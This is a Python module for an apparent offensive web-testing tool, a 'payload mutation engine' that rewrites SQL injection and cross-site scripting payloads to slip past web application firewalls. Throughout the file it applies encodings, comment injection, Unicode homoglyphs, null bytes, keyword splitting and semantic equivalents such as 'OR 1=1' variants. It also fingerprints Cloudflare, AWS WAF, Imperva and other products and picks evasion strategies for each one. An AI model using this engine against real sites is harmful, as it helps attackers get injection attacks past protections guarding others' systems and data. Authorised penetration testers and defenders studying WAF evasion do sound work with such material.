"""
Intelligent Payload Mutation Engine

AI-driven payload mutation that learns from WAF blocks and adapts payloads
to bypass security controls while maintaining exploit semantics.
"""

import random
import hashlib
import re
import json
import base64
import html
from typing import Dict, List, Any, Optional, Set, Tuple, Callable
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import quote, quote_plus, unquote
import logging
from collections import defaultdict

logger = logging.getLogger(__name__)


class MutationCategory(Enum):
    """Categories of payload mutations."""
    ENCODING = "encoding"
    CASE_MANIPULATION = "case_manipulation"
    WHITESPACE = "whitespace"
    COMMENT_INJECTION = "comment_injection"
    STRING_MANIPULATION = "string_manipulation"
    SYNTAX_VARIATION = "syntax_variation"
    DOUBLE_ENCODING = "double_encoding"
    UNICODE_BYPASS = "unicode_bypass"
    CONCATENATION = "concatenation"
    SEMANTIC_EQUIVALENT = "semantic_equivalent"
    FUNCTION_EQUIVALENT = "function_equivalent"
    CASE_TOGGLE = "case_toggle"
    NULL_BYTE = "null_byte"
    PADDING = "padding"
    FORMAT_STRING = "format_string"


class PayloadContext(Enum):
    """Context where payload will be used."""
    URL_PARAM = "url_param"
    BODY_PARAM = "body_param"
    HEADER = "header"
    COOKIE = "cookie"
    JSON = "json"
    XML = "xml"
    PATH = "path"
    FRAGMENT = "fragment"


@dataclass
class MutationResult:
    """Result of a payload mutation."""
    original: str
    mutated: str
    category: MutationCategory
    description: str
    evasion_techniques: List[str]
    confidence: float  # Confidence this will bypass WAF


@dataclass
class WAFBlockInfo:
    """Information about a WAF block."""
    payload: str
    response_code: int
    response_body: str
    block_pattern: Optional[str] = None
    waf_signature: Optional[str] = None


@dataclass
class MutationFeedback:
    """Feedback from mutation testing."""
    payload: str
    mutation_category: MutationCategory
    success: bool  # Did it bypass?
    blocked: bool
    response_code: int
    detection_bypass: bool = False


class PayloadMutationEngine:
    """
    Intelligent payload mutation engine that learns from WAF responses
    and generates semantically equivalent evasion payloads.
    """
    
    # SQL keywords that can be obfuscated
    SQL_KEYWORDS = [
        "SELECT", "FROM", "WHERE", "UNION", "AND", "OR", "ORDER", "BY",
        "GROUP", "HAVING", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE",
        "ALTER", "TABLE", "DATABASE", "EXEC", "EXECUTE", "INTO", "VALUES",
        "SET", "LIKE", "BETWEEN", "IN", "NULL", "NOT", "JOIN", "INNER",
        "LEFT", "RIGHT", "OUTER", "CROSS", "CASE", "WHEN", "THEN", "ELSE",
        "END", "EXISTS", "ALL", "ANY", "DISTINCT", "AS", "LIMIT", "OFFSET",
        "SLEEP", "WAITFOR", "DELAY", "BENCHMARK", "SUBSTRING", "CONCAT",
        "CHAR", "CHR", "ASCII", "CONVERT", "CAST", "COALESCE", "IFNULL",
        "VERSION", "USER", "DATABASE", "SCHEMA", "INFORMATION_SCHEMA",
    ]
    
    # XSS tags and attributes that can be obfuscated
    XSS_TAGS = ["script", "img", "svg", "body", "iframe", "input", "a", 
                "div", "form", "button", "object", "embed", "video", "audio",
                "marquee", "details", "math", "style", "link", "meta"]
    
    XSS_EVENTS = ["onerror", "onload", "onclick", "onmouseover", "onfocus",
                  "onblur", "onchange", "onsubmit", "onkeydown", "onkeyup",
                  "onkeypress", "ondblclick", "oncontextmenu", "onwheel",
                  "ondrag", "ondrop", "oncopy", "oncut", "onpaste", "onscroll",
                  "onanimationend", "ontransitionend", "ontoggle", "onpointerover"]
    
    # Common WAF signatures
    WAF_SIGNATURES = {
        "cloudflare": ["cloudflare", "cf-ray", "cf-request-id", "__cfduid"],
        "akamai": ["akamai", "ak_bmsc", "bm_sz"],
        "aws_waf": ["aws", "x-amzn-requestid", "x-amz-cf-id"],
        "imperva": ["incapsula", "visid_incap", "incap_ses"],
        "f5": ["f5", "bigipserver", "x-wa-info"],
        "modsecurity": ["modsecurity", "mod_security"],
        "fortinet": ["fortinet", "fortigate"],
        "barracuda": ["barracuda", "barra_counter_session"],
        "sucuri": ["sucuri", "x-sucuri-id"],
    }
    
    # Unicode homoglyphs for characters
    UNICODE_HOMOGLYPHS = {
        'a': ['а', 'ạ', 'ä', 'à', 'á', 'ã', 'å', 'ā', 'ă'],
        'e': ['е', 'ẹ', 'ë', 'è', 'é', 'ê', 'ē', 'ĕ'],
        'i': ['і', 'ị', 'ï', 'ì', 'í', 'î', 'ī', 'ĭ'],
        'o': ['о', 'ọ', 'ö', 'ò', 'ó', 'ô', 'õ', 'ō', 'ŏ'],
        'u': ['υ', 'ụ', 'ü', 'ù', 'ú', 'û', 'ū', 'ŭ'],
        'c': ['с', 'ç', 'ć', 'ĉ', 'ċ', 'č'],
        's': ['ѕ', 'ş', 'ś', 'ŝ', 'ș'],
        'p': ['р', 'ρ'],
        'x': ['х', 'ẋ'],
        'y': ['у', 'ý', 'ŷ', 'ÿ'],
        'n': ['п', 'ñ', 'ń', 'ņ', 'ň'],
    }
    
    # Equivalent SQL functions
    SQL_FUNCTION_EQUIVALENTS = {
        "SUBSTRING": ["SUBSTR", "MID", "LEFT", "RIGHT"],
        "CONCAT": ["||", "+", "CONCAT_WS"],
        "CHAR": ["CHR"],
        "ASCII": ["ORD"],
        "IF": ["IIF", "CASE WHEN"],
        "IFNULL": ["COALESCE", "NVL", "ISNULL"],
        "LENGTH": ["LEN", "CHAR_LENGTH", "CHARACTER_LENGTH"],
        "SLEEP": ["WAITFOR DELAY", "BENCHMARK", "PG_SLEEP"],
    }
    
    def __init__(self):
        """Initialize the mutation engine."""
        self._blocked_patterns: Dict[str, List[WAFBlockInfo]] = defaultdict(list)
        self._successful_mutations: Dict[MutationCategory, int] = defaultdict(int)
        self._failed_mutations: Dict[MutationCategory, int] = defaultdict(int)
        self._mutation_history: List[MutationFeedback] = []
        self._detected_waf: Optional[str] = None
        self._stats = {
            "mutations_generated": 0,
            "successful_bypasses": 0,
            "total_feedback": 0,
        }

    def mutate_payload(
        self,
        payload: str,
        context: PayloadContext = PayloadContext.URL_PARAM,
        categories: Optional[List[MutationCategory]] = None,
        count: int = 10,
        avoid_blocked: bool = True,
    ) -> List[MutationResult]:
        """
        Generate mutated versions of a payload.
        
        Args:
            payload: The original payload to mutate
            context: Where the payload will be used
            categories: Specific mutation categories to use (all if None)
            count: Number of mutations to generate
            avoid_blocked: Whether to avoid patterns known to be blocked
            
        Returns:
            List of mutation results
        """
        results = []
        seen_hashes = set()
        
        # Determine which categories to use
        if categories is None:
            categories = list(MutationCategory)
        
        # Weight categories by success rate
        weighted_categories = self._get_weighted_categories(categories)
        
        attempts = 0
        max_attempts = count * 3  # Allow extra attempts to get unique mutations
        
        while len(results) < count and attempts < max_attempts:
            attempts += 1
            
            # Select a mutation category
            category = random.choices(
                list(weighted_categories.keys()),
                weights=list(weighted_categories.values()),
                k=1
            )[0]
            
            # Generate mutation
            mutation = self._apply_mutation(payload, category, context)
            
            if mutation is None:
                continue
            
            # Check for duplicates
            mutation_hash = hashlib.md5(mutation.mutated.encode()).hexdigest()
            if mutation_hash in seen_hashes:
                continue
            seen_hashes.add(mutation_hash)
            
            # Check if this pattern was previously blocked
            if avoid_blocked and self._is_likely_blocked(mutation.mutated):
                continue
            
            results.append(mutation)
            self._stats["mutations_generated"] += 1
        
        return results

    def _get_weighted_categories(
        self, categories: List[MutationCategory]
    ) -> Dict[MutationCategory, float]:
        """Get categories weighted by success rate."""
        weights = {}
        
        for category in categories:
            successes = self._successful_mutations.get(category, 0)
            failures = self._failed_mutations.get(category, 0)
            total = successes + failures
            
            if total > 0:
                # Use success rate + base weight
                weights[category] = (successes / total) * 0.7 + 0.3
            else:
                # No data, use uniform weight
                weights[category] = 1.0
        
        return weights

    def _apply_mutation(
        self,
        payload: str,
        category: MutationCategory,
        context: PayloadContext,
    ) -> Optional[MutationResult]:
        """Apply a specific mutation category to the payload."""
        mutation_funcs = {
            MutationCategory.ENCODING: self._mutate_encoding,
            MutationCategory.CASE_MANIPULATION: self._mutate_case,
            MutationCategory.WHITESPACE: self._mutate_whitespace,
            MutationCategory.COMMENT_INJECTION: self._mutate_comments,
            MutationCategory.STRING_MANIPULATION: self._mutate_strings,
            MutationCategory.SYNTAX_VARIATION: self._mutate_syntax,
            MutationCategory.DOUBLE_ENCODING: self._mutate_double_encoding,
            MutationCategory.UNICODE_BYPASS: self._mutate_unicode,
            MutationCategory.CONCATENATION: self._mutate_concatenation,
            MutationCategory.SEMANTIC_EQUIVALENT: self._mutate_semantic,
            MutationCategory.FUNCTION_EQUIVALENT: self._mutate_functions,
            MutationCategory.CASE_TOGGLE: self._mutate_case_toggle,
            MutationCategory.NULL_BYTE: self._mutate_null_byte,
            MutationCategory.PADDING: self._mutate_padding,
            MutationCategory.FORMAT_STRING: self._mutate_format_string,
        }
        
        func = mutation_funcs.get(category)
        if func is None:
            return None
        
        return func(payload, context)

    def _mutate_encoding(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply various encodings to the payload."""
        encodings = [
            ("url", lambda p: quote(p, safe="")),
            ("url_plus", lambda p: quote_plus(p)),
            ("double_url", lambda p: quote(quote(p, safe=""), safe="")),
            ("hex", lambda p: "".join(f"\\x{ord(c):02x}" for c in p)),
            ("html_entity", lambda p: "".join(f"&#{ord(c)};" for c in p)),
            ("html_hex", lambda p: "".join(f"&#x{ord(c):x};" for c in p)),
            ("unicode_escape", lambda p: p.encode("unicode_escape").decode()),
            ("base64", lambda p: base64.b64encode(p.encode()).decode()),
            ("html_named", lambda p: html.escape(p)),
            ("octal", lambda p: "".join(f"\\{ord(c):03o}" for c in p)),
        ]
        
        encoding_name, encode_func = random.choice(encodings)
        
        try:
            mutated = encode_func(payload)
            return MutationResult(
                original=payload,
                mutated=mutated,
                category=MutationCategory.ENCODING,
                description=f"Applied {encoding_name} encoding",
                evasion_techniques=[encoding_name],
                confidence=0.6,
            )
        except Exception:
            return None

    def _mutate_case(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply case-based mutations."""
        techniques = [
            ("lowercase", payload.lower()),
            ("uppercase", payload.upper()),
            ("title_case", payload.title()),
            ("swap_case", payload.swapcase()),
            ("random_case", "".join(
                c.upper() if random.random() > 0.5 else c.lower() 
                for c in payload
            )),
        ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.CASE_MANIPULATION,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.4,
        )

    def _mutate_whitespace(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply whitespace-based mutations."""
        # SQL comment as whitespace
        sql_whitespace = ["/**/", "/*a*/", "/*-*/", "%09", "%0a", "%0d", 
                         "%0b", "%0c", "%a0", "/*! */"]
        
        techniques = [
            ("tab_inject", payload.replace(" ", "\t")),
            ("newline_inject", payload.replace(" ", "\n")),
            ("carriage_return", payload.replace(" ", "\r")),
            ("sql_comment_ws", payload.replace(" ", random.choice(sql_whitespace))),
            ("multi_space", payload.replace(" ", "    ")),
            ("no_space", payload.replace(" ", "")),
            ("url_encoded_space", payload.replace(" ", "%20")),
            ("plus_space", payload.replace(" ", "+")),
            ("mixed_whitespace", payload.replace(" ", random.choice(["\t", "\n", "\r\n", "  "]))),
        ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.WHITESPACE,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.5,
        )

    def _mutate_comments(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Inject comments to break up payload."""
        comment_styles = [
            ("sql_inline", ("/*", "*/")),
            ("sql_line", ("--", "\n")),
            ("sql_hash", ("#", "\n")),
            ("mysql_version", ("/*!", "*/")),
            ("html", ("<!--", "-->")),
            ("c_style", ("//", "\n")),
        ]
        
        style_name, (open_comment, close_comment) = random.choice(comment_styles)
        
        # Inject comments between characters
        mutated = ""
        for i, char in enumerate(payload):
            mutated += char
            if i < len(payload) - 1 and random.random() > 0.7:
                mutated += f"{open_comment}{close_comment}"
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.COMMENT_INJECTION,
            description=f"Injected {style_name} comments",
            evasion_techniques=[style_name],
            confidence=0.65,
        )

    def _mutate_strings(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Manipulate string representations."""
        techniques = []
        
        # String concatenation in SQL
        if any(kw in payload.upper() for kw in self.SQL_KEYWORDS):
            techniques.extend([
                ("char_concat", self._sql_char_concat(payload)),
                ("hex_string", self._sql_hex_string(payload)),
            ])
        
        # JavaScript string tricks
        if "javascript" in payload.lower() or "script" in payload.lower():
            techniques.extend([
                ("js_escape", self._js_escape_string(payload)),
                ("js_unicode", self._js_unicode_string(payload)),
            ])
        
        if not techniques:
            # Generic techniques
            techniques = [
                ("reverse_concat", self._reverse_and_concat(payload)),
                ("split_join", "".join(payload.split())),
            ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.STRING_MANIPULATION,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.55,
        )

    def _mutate_syntax(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply syntax variations."""
        mutated = payload
        techniques_applied = []
        
        # SQL syntax variations
        if any(kw in payload.upper() for kw in ["SELECT", "UNION", "AND", "OR"]):
            variations = [
                # UNION variations
                (r"\bUNION\s+SELECT\b", "UNION ALL SELECT"),
                (r"\bUNION\s+SELECT\b", "UNION DISTINCT SELECT"),
                # AND/OR variations
                (r"\bAND\b", "&&"),
                (r"\bOR\b", "||"),
                (r"\bAND\b", "AND(1)AND"),
                # Comment tricks
                (r"\bSELECT\b", "SELECT/**/"),
                (r"\bFROM\b", "/*!FROM*/"),
                # Equality variations
                (r"=", " LIKE "),
                (r"=", " REGEXP "),
                (r"=\s*'([^']+)'", r"IN('\1')"),
            ]
            
            for pattern, replacement in variations:
                if re.search(pattern, mutated, re.IGNORECASE) and random.random() > 0.5:
                    mutated = re.sub(pattern, replacement, mutated, count=1, flags=re.IGNORECASE)
                    techniques_applied.append(f"sql_{pattern[:10]}")
        
        # XSS syntax variations
        if "<" in payload or "javascript" in payload.lower():
            variations = [
                # Tag variations
                (r"<script", "<ScRiPt"),
                (r"<img", "<IMG"),
                (r"<svg", "<sVg"),
                # Event variations
                (r"onerror", "ONERROR"),
                (r"onload", "onLoAd"),
                # JavaScript protocol
                (r"javascript:", "javascript\t:"),
                (r"javascript:", "java script:"),
                (r"javascript:", "&#106;avascript:"),
            ]
            
            for pattern, replacement in variations:
                if re.search(pattern, mutated, re.IGNORECASE) and random.random() > 0.5:
                    mutated = re.sub(pattern, replacement, mutated, count=1, flags=re.IGNORECASE)
                    techniques_applied.append(f"xss_{pattern[:10]}")
        
        if mutated == payload:
            return None
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.SYNTAX_VARIATION,
            description=f"Applied syntax variations: {techniques_applied}",
            evasion_techniques=techniques_applied,
            confidence=0.6,
        )

    def _mutate_double_encoding(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply double encoding."""
        encoding_chains = [
            ("double_url", lambda p: quote(quote(p, safe=""), safe="")),
            ("url_then_unicode", lambda p: quote(p.encode("unicode_escape").decode(), safe="")),
            ("html_then_url", lambda p: quote(html.escape(p), safe="")),
            ("triple_url", lambda p: quote(quote(quote(p, safe=""), safe=""), safe="")),
            ("mixed_encoding", self._mixed_encoding),
        ]
        
        enc_name, encode_func = random.choice(encoding_chains)
        
        try:
            mutated = encode_func(payload)
            return MutationResult(
                original=payload,
                mutated=mutated,
                category=MutationCategory.DOUBLE_ENCODING,
                description=f"Applied {enc_name}",
                evasion_techniques=[enc_name],
                confidence=0.7,
            )
        except Exception:
            return None

    def _mutate_unicode(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply Unicode-based bypasses."""
        techniques = [
            ("homoglyph", self._apply_homoglyphs),
            ("fullwidth", self._to_fullwidth),
            ("overlong_utf8", self._overlong_utf8_encode),
            ("unicode_normalization", self._unicode_normalization_bypass),
            ("bom_injection", lambda p: "\ufeff" + p),
            ("zero_width", lambda p: "\u200b".join(p)),
        ]
        
        tech_name, transform_func = random.choice(techniques)
        
        try:
            mutated = transform_func(payload)
            return MutationResult(
                original=payload,
                mutated=mutated,
                category=MutationCategory.UNICODE_BYPASS,
                description=f"Applied {tech_name}",
                evasion_techniques=[tech_name],
                confidence=0.65,
            )
        except Exception:
            return None

    def _mutate_concatenation(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply string concatenation techniques."""
        techniques = []
        
        # SQL concatenation
        if any(kw in payload.upper() for kw in self.SQL_KEYWORDS):
            # Split keywords
            for kw in self.SQL_KEYWORDS:
                if kw in payload.upper():
                    idx = payload.upper().find(kw)
                    actual_kw = payload[idx:idx+len(kw)]
                    split_point = len(kw) // 2
                    
                    concat_versions = [
                        f"'{actual_kw[:split_point]}'||'{actual_kw[split_point:]}'",
                        f"CONCAT('{actual_kw[:split_point]}','{actual_kw[split_point:]}')",
                        f"'{actual_kw[:split_point]}''{actual_kw[split_point:]}'",  # MySQL adjacent string concat
                    ]
                    
                    for cv in concat_versions:
                        mutated = payload[:idx] + cv + payload[idx+len(kw):]
                        techniques.append((f"sql_concat_{kw}", mutated))
        
        # JavaScript concatenation
        if "script" in payload.lower():
            techniques.extend([
                ("js_plus_concat", payload.replace("script", "'scr'+'ipt'")),
                ("js_join", payload.replace("script", "['scr','ipt'].join('')")),
            ])
        
        if not techniques:
            # Generic split
            mid = len(payload) // 2
            techniques = [
                ("generic_split", f"{payload[:mid]}+{payload[mid:]}"),
            ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.CONCATENATION,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.55,
        )

    def _mutate_semantic(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply semantically equivalent mutations."""
        mutated = payload
        techniques_applied = []
        
        # SQL semantic equivalents
        sql_equivalents = [
            (r"1\s*=\s*1", ["1", "2>1", "1<2", "'a'='a'", "1 IS NOT NULL"]),
            (r"'?\s*OR\s+'?1'?\s*=\s*'?1'?", ["OR 1", "OR 2>1", "OR 'x' LIKE 'x'"]),
            (r"1\s*=\s*0", ["0", "1>2", "2<1", "'a'='b'", "NULL"]),
            (r"LIMIT\s+\d+", [f"LIMIT {random.randint(1,100)}"]),
            (r"--\s*$", ["-- -", "#", ";--", "/*"]),
        ]
        
        for pattern, replacements in sql_equivalents:
            if re.search(pattern, mutated, re.IGNORECASE):
                replacement = random.choice(replacements)
                mutated = re.sub(pattern, replacement, mutated, flags=re.IGNORECASE)
                techniques_applied.append(f"semantic_{pattern[:10]}")
        
        # XSS semantic equivalents
        if "alert" in payload.lower():
            alert_equivalents = [
                "prompt", "confirm", "console.log", "eval",
                "window['alert']", "this['alert']", "top.alert",
                "self.alert", "parent.alert", "frames.alert",
            ]
            replacement = random.choice(alert_equivalents)
            mutated = re.sub(r"alert", replacement, mutated, flags=re.IGNORECASE)
            techniques_applied.append("semantic_alert_equiv")
        
        if mutated == payload:
            return None
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.SEMANTIC_EQUIVALENT,
            description=f"Applied semantic equivalents: {techniques_applied}",
            evasion_techniques=techniques_applied,
            confidence=0.7,
        )

    def _mutate_functions(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Replace functions with equivalents."""
        mutated = payload
        techniques_applied = []
        
        for func, equivalents in self.SQL_FUNCTION_EQUIVALENTS.items():
            if func.upper() in mutated.upper():
                replacement = random.choice(equivalents)
                mutated = re.sub(
                    rf"\b{func}\b", 
                    replacement, 
                    mutated, 
                    flags=re.IGNORECASE
                )
                techniques_applied.append(f"func_{func}_to_{replacement}")
        
        if mutated == payload:
            return None
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.FUNCTION_EQUIVALENT,
            description=f"Replaced functions: {techniques_applied}",
            evasion_techniques=techniques_applied,
            confidence=0.65,
        )

    def _mutate_case_toggle(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Toggle case of specific keywords."""
        mutated = payload
        toggled = []
        
        all_keywords = self.SQL_KEYWORDS + self.XSS_TAGS + self.XSS_EVENTS
        
        for kw in all_keywords:
            if kw.lower() in mutated.lower():
                # Generate random case version
                new_kw = "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in kw
                )
                mutated = re.sub(rf"\b{kw}\b", new_kw, mutated, flags=re.IGNORECASE)
                toggled.append(f"{kw}->{new_kw}")
        
        if mutated == payload:
            return None
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.CASE_TOGGLE,
            description=f"Toggled keyword cases: {toggled[:3]}...",
            evasion_techniques=["keyword_case_toggle"],
            confidence=0.5,
        )

    def _mutate_null_byte(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Inject null bytes for bypass."""
        null_variants = ["%00", "\x00", "\\x00", "\\0", "&#0;", "&#x0;"]
        null_byte = random.choice(null_variants)
        
        techniques = [
            ("prefix", null_byte + payload),
            ("suffix", payload + null_byte),
            ("inline", payload[:len(payload)//2] + null_byte + payload[len(payload)//2:]),
            ("extension_bypass", payload.replace(".", null_byte + ".")),
        ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.NULL_BYTE,
            description=f"Applied {tech_name} null byte injection",
            evasion_techniques=[tech_name],
            confidence=0.45,
        )

    def _mutate_padding(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Add padding to bypass length-based filters."""
        padding_chars = [" ", "\t", "\n", "/**/", "  ", "\r\n"]
        padding = random.choice(padding_chars) * random.randint(1, 10)
        
        techniques = [
            ("prefix_pad", padding + payload),
            ("suffix_pad", payload + padding),
            ("both_pad", padding + payload + padding),
            ("junk_prefix", "a=1&" + payload),
            ("long_param", "x" * random.randint(100, 500) + "&p=" + payload),
        ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.PADDING,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.35,
        )

    def _mutate_format_string(
        self, payload: str, context: PayloadContext
    ) -> Optional[MutationResult]:
        """Apply format string techniques."""
        techniques = [
            ("percent_encoding", payload.replace("%", "%%")),
            ("format_spec", f"%s{payload}"),
            ("width_spec", f"%100s{payload}"),
            ("hex_format", f"%x{payload}"),
        ]
        
        tech_name, mutated = random.choice(techniques)
        
        return MutationResult(
            original=payload,
            mutated=mutated,
            category=MutationCategory.FORMAT_STRING,
            description=f"Applied {tech_name}",
            evasion_techniques=[tech_name],
            confidence=0.3,
        )

    # Helper methods for complex mutations
    
    def _sql_char_concat(self, payload: str) -> str:
        """Convert string to CHAR() concatenation."""
        chars = [f"CHAR({ord(c)})" for c in payload]
        return "CONCAT(" + ",".join(chars) + ")"

    def _sql_hex_string(self, payload: str) -> str:
        """Convert string to hex representation."""
        hex_str = payload.encode().hex()
        return f"0x{hex_str}"

    def _js_escape_string(self, payload: str) -> str:
        """Apply JavaScript escape sequences."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def _js_unicode_string(self, payload: str) -> str:
        """Apply JavaScript unicode escapes."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def _reverse_and_concat(self, payload: str) -> str:
        """Reverse string and show concat."""
        reversed_payload = payload[::-1]
        return f"reverse('{reversed_payload}')"

    def _mixed_encoding(self, payload: str) -> str:
        """Apply mixed encoding techniques."""
        result = ""
        for c in payload:
            choice = random.randint(0, 3)
            if choice == 0:
                result += quote(c, safe="")
            elif choice == 1:
                result += f"&#{ord(c)};"
            elif choice == 2:
                result += f"&#x{ord(c):x};"
            else:
                result += c
        return result

    def _apply_homoglyphs(self, payload: str) -> str:
        """Replace characters with Unicode homoglyphs."""
        result = ""
        for c in payload.lower():
            if c in self.UNICODE_HOMOGLYPHS and random.random() > 0.5:
                result += random.choice(self.UNICODE_HOMOGLYPHS[c])
            else:
                result += c
        return result

    def _to_fullwidth(self, payload: str) -> str:
        """Convert to fullwidth Unicode characters."""
        result = ""
        for c in payload:
            if 0x21 <= ord(c) <= 0x7e:  # ASCII printable
                result += chr(ord(c) + 0xfee0)
            else:
                result += c
        return result

    def _overlong_utf8_encode(self, payload: str) -> str:
        """Create overlong UTF-8 encoding (for bypass attempts)."""
        # This creates URL-encoded overlong sequences
        result = ""
        for c in payload:
            if ord(c) < 128:
                # Create 2-byte overlong encoding
                result += f"%c0%{0x80 | ord(c):02x}"
            else:
                result += quote(c, safe="")
        return result

    def _unicode_normalization_bypass(self, payload: str) -> str:
        """Apply Unicode normalization differences."""
        import unicodedata
        # Try different normalization forms
        forms = ["NFC", "NFD", "NFKC", "NFKD"]
        form = random.choice(forms)
        return unicodedata.normalize(form, payload)

    def _is_likely_blocked(self, payload: str) -> bool:
        """Check if a payload pattern was previously blocked."""
        # Create a simplified pattern from the payload
        simplified = re.sub(r'[a-zA-Z0-9]', 'X', payload)
        simplified = re.sub(r'\s+', ' ', simplified)
        
        for waf_type, blocks in self._blocked_patterns.items():
            for block in blocks:
                if block.block_pattern and re.search(block.block_pattern, payload, re.IGNORECASE):
                    return True
        
        return False

    def record_feedback(self, feedback: MutationFeedback):
        """
        Record feedback about a mutation attempt.
        
        Args:
            feedback: Information about what happened with the mutation
        """
        self._mutation_history.append(feedback)
        self._stats["total_feedback"] += 1
        
        if feedback.success:
            self._successful_mutations[feedback.mutation_category] += 1
            self._stats["successful_bypasses"] += 1
        else:
            self._failed_mutations[feedback.mutation_category] += 1
            
            if feedback.blocked:
                # Record the blocked pattern
                self._blocked_patterns["unknown"].append(WAFBlockInfo(
                    payload=feedback.payload,
                    response_code=feedback.response_code,
                    response_body="",
                ))

    def detect_waf(
        self, 
        response_headers: Dict[str, str], 
        response_body: str
    ) -> Optional[str]:
        """
        Detect WAF from response.
        
        Args:
            response_headers: HTTP response headers
            response_body: HTTP response body
            
        Returns:
            WAF name if detected, None otherwise
        """
        headers_lower = {k.lower(): v.lower() for k, v in response_headers.items()}
        body_lower = response_body.lower()
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                sig_lower = sig.lower()
                # Check headers
                if any(sig_lower in h or sig_lower in v 
                       for h, v in headers_lower.items()):
                    self._detected_waf = waf_name
                    return waf_name
                # Check body
                if sig_lower in body_lower:
                    self._detected_waf = waf_name
                    return waf_name
        
        return None

    def get_waf_specific_mutations(
        self, 
        payload: str, 
        waf_name: str
    ) -> List[MutationResult]:
        """
        Get mutations optimized for a specific WAF.
        
        Args:
            payload: The original payload
            waf_name: Name of the detected WAF
            
        Returns:
            List of WAF-specific mutations
        """
        waf_strategies = {
            "cloudflare": [
                MutationCategory.UNICODE_BYPASS,
                MutationCategory.DOUBLE_ENCODING,
                MutationCategory.CASE_TOGGLE,
            ],
            "aws_waf": [
                MutationCategory.WHITESPACE,
                MutationCategory.COMMENT_INJECTION,
                MutationCategory.ENCODING,
            ],
            "imperva": [
                MutationCategory.SEMANTIC_EQUIVALENT,
                MutationCategory.FUNCTION_EQUIVALENT,
                MutationCategory.CONCATENATION,
            ],
            "modsecurity": [
                MutationCategory.DOUBLE_ENCODING,
                MutationCategory.NULL_BYTE,
                MutationCategory.PADDING,
            ],
            "f5": [
                MutationCategory.UNICODE_BYPASS,
                MutationCategory.STRING_MANIPULATION,
                MutationCategory.SYNTAX_VARIATION,
            ],
        }
        
        categories = waf_strategies.get(
            waf_name.lower(), 
            list(MutationCategory)
        )
        
        return self.mutate_payload(
            payload, 
            categories=categories, 
            count=15,
            avoid_blocked=True,
        )

    def get_stats(self) -> Dict[str, Any]:
        """Get mutation engine statistics."""
        return {
            **self._stats,
            "successful_by_category": {k.value if hasattr(k, 'value') else str(k): v for k, v in self._successful_mutations.items()},
            "failed_by_category": {k.value if hasattr(k, 'value') else str(k): v for k, v in self._failed_mutations.items()},
            "detected_waf": self._detected_waf,
            "blocked_patterns_count": sum(len(v) for v in self._blocked_patterns.values()),
        }

    def reset_learning(self):
        """Reset learned patterns and statistics."""
        self._blocked_patterns.clear()
        self._successful_mutations.clear()
        self._failed_mutations.clear()
        self._mutation_history.clear()
        self._detected_waf = None
        self._stats = {
            "mutations_generated": 0,
            "successful_bypasses": 0,
            "total_feedback": 0,
        }


# Singleton instance
_mutation_engine: Optional[PayloadMutationEngine] = None


def get_mutation_engine() -> PayloadMutationEngine:
    """Get or create the mutation engine instance."""
    global _mutation_engine
    if _mutation_engine is None:
        _mutation_engine = PayloadMutationEngine()
    return _mutation_engine
